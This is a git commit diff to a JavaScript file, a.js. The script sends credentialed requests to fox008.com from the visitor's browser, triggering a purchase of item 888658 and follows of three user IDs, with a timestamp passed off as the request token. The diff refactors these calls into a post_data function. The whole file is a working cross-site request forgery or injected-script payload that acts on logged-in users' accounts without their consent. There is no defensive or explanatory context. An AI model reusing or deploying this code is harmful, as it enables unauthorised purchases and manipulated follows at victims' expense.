aae06eb8b7355b63fd32c2aca57402ba1c809030
fashao <ufo@cs229.com>
2016-08-11 15:19:20 +0800

    jj

--- a.js
+++ a.js
@@ -6,25 +6,22 @@ function url_follow(userid)
 {
 	return "http://www.fox008.com/user/follow?t="+String(new Date().getTime())+"&userId="+userid+"&type=&request_token="+String(new Date().getTime());
 }
-var xmlhttp;
-if (window.XMLHttpRequest)
-  {// code for IE7+, Firefox, Chrome, Opera, Safari
-  xmlhttp=new XMLHttpRequest();
-  }
-else
-  {// code for IE6, IE5
-  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
-  }
-xmlhttp.onreadystatechange=function()
-  {
-  }
-
-xmlhttp.withCredentials = true;
-xmlhttp.open("POST",url_buy("888658"),true);
-xmlhttp.send(null);
-xmlhttp.open("GET",url_follow("137536"),true);
-xmlhttp.send(null);
-xmlhttp.open("GET",url_follow("140665"),true);
-xmlhttp.send(null);
-xmlhttp.open("GET",url_follow("176940"),true);
-xmlhttp.send(null);
+function post_data(url)
+{
+	var xmlhttp;
+	if (window.XMLHttpRequest)
+  	{// code for IE7+, Firefox, Chrome, Opera, Safari
+  		xmlhttp=new XMLHttpRequest();
+  	}
+	else
+  	{// code for IE6, IE5
+  		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  	}
+	xmlhttp.withCredentials = true;
+	xmlhttp.open("POST",url,true);
+	xmlhttp.send(null);
+}
+post_data(url_buy("888658"));
+post_data(url_follow("137536"));
+post_data(url_follow("140665"));
+post_data(url_follow("176940"));
